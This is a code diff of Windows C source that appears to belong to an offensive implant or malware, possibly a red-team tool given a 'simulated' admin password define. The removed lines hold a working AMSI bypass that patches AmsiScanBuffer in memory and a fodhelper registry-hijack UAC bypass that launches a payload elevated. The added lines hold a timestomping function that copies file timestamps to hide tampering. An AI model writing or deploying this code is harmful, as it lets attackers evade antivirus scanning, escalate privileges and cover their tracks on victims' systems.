@@ -7,62 +7,24 @@
 
 #define SIMULATED_ADMIN_PASS L"*TIsoporte"
 
-typedef struct _AMSI_API {
-    ULONG_PTR NtProtectVirtualMemory;
-    ULONG_PTR NtWriteVirtualMemory;
-} AMSI_API;
-
-static BOOL BypassAMSI(API_TABLE* api) {
-    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
-    if (!hAmsi) return FALSE;
-
-    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-    if (!pAmsiScanBuffer) return FALSE;
-
-    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-
-    DWORD oldProtect;
-    SIZE_T patchSize = sizeof(patch);
-    PVOID baseAddr = pAmsiScanBuffer;
-
-    if (((NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->NtProtectVirtualMemory)(
-        GetCurrentProcess(), &baseAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
-        
-        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
-
-        ((NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->NtProtectVirtualMemory)(
-            GetCurrentProcess(), &baseAddr, &patchSize, oldProtect, &oldProtect);
-        
-        return TRUE;
-    }
-
-    return FALSE;
-}
-
-static BOOL BypassUAC(const wchar_t* payloadPath) {
-    HKEY hKey;
-    LPCWSTR registryPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
+static BOOL Timestomp(LPCWSTR targetPath, LPCWSTR sourcePath) {
+    HANDLE hTarget = CreateFileW(targetPath, GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hSource = CreateFileW(sourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, registryPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
+    if (hTarget == INVALID_HANDLE_VALUE || hSource == INVALID_HANDLE_VALUE) {
+        if (hTarget != INVALID_HANDLE_VALUE) CloseHandle(hTarget);
+        if (hSource != INVALID_HANDLE_VALUE) CloseHandle(hSource);
         return FALSE;
     }
 
-    RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)payloadPath, (DWORD)(wcslen(payloadPath) + 1) * sizeof(wchar_t));
-    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
-    RegCloseKey(hKey);
-
-    SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.lpVerb = L"open";
-    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
-    sei.nShow = SW_HIDE;
-    
-    if (ShellExecuteExW(&sei)) {
-        Sleep(2000);
-        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
-        return TRUE;
+    FILETIME ftCreate, ftAccess, ftWrite;
+    if (GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite)) {
+        SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
     }
 
-    return FALSE;
+    CloseHandle(hTarget);
+    CloseHandle(hSource);
+    return TRUE;
 }
 
 static BOOL IsRunningAsAdmin() {
